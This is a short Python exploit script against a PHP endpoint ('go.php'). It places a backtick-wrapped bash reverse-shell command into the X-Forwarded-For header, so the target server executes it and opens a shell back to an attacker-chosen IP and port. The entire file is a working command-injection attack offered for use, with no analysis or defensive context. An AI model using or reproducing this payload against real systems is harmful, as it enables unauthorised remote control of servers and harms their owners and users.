import sys
import requests
from urllib.parse import urljoin

if len(sys.argv) < 4:
 print("./exploit.py <http://example.com/t/go.php> <revshell ip> <revshell port>")
 sys.exit(-1)

def upshell():
 headers = {
  "X-Forwarded-For": f'`/bin/bash -i &> /dev/tcp/{sys.argv[2]}/{sys.argv[3]} 0>&1`'
 }
 print("Getting your shell...")
 print(headers["X-Forwarded-For"])
 url = sys.argv[1]
 with requests.get(url=url, headers=headers) as x:
  print(x.text)

upshell()
